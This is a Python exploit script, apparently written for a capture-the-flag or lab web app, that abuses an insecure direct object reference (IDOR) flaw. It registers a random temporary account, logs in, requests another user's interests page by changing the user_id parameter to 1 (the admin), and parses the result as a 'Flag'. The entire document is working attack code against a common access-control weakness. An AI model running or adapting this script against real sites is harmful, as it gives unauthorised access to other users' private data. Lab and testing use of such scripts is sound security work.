

import requests
import sys
import random
import string

def random_string(length=10):
    return ''.join(random.choice(string.ascii_lowercase) for _ in range(length))

def exploit_idor(target_url):
    """
    Exploits the IDOR vulnerability to view admin's interests.
    """
    print("[*] Starting IDOR exploit.")
    s = requests.Session()

    # Step 1: Create a temporary user to get an authenticated session
    username = random_string()
    password = random_string()
    register_data = {'username': username, 'password': password, 'password2': password}
    
    try:
        r_register = s.post(f"{target_url}/register", data=register_data, timeout=5, allow_redirects=False)
        if r_register.status_code != 302:
            print(f"[-] Failed to register temporary user. Status: {r_register.status_code}")
            return
        print(f"[*] Registered temporary user: {username}")
    except requests.exceptions.RequestException as e:
        print(f"[-] Failed to connect to the target: {e}")
        return

    # Step 2: Log in as the temporary user
    login_data = {'username': username, 'password': password}
    r_login = s.post(f"{target_url}/login", data=login_data, allow_redirects=False)
    if r_login.status_code != 302:
        print("[-] Failed to log in as temporary user.")
        return
    print("[*] Logged in successfully.")

    # Step 3: Exploit IDOR to get admin's interests (user_id=1)
    print("[*] Attempting to access admin's interests via IDOR...")
    r_idor = s.get(f"{target_url}/interests?user_id=1")
    
    if r_idor.status_code == 200 and "admin's Interests" in r_idor.text:
        print("[+] Success! Retrieved admin's interests page.")
        # Simple parsing to extract interests
        interests = [line.strip().replace('<li>', '').replace('</li>', '') for line in r_idor.text.split('\n') if '<li>' in line]
        print("[+] Admin Interests (Flag):")
        for interest in interests:
            print(f"    - {interest}")
    else:
        print("[-] IDOR exploit failed.")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python exploit_bug2.py <target_url>")
        print("Example: python exploit_bug2.py http://127.0.0.1:5000")
        sys.exit(1)
        
    TARGET_URL = sys.argv[1]
    exploit_idor(TARGET_URL)

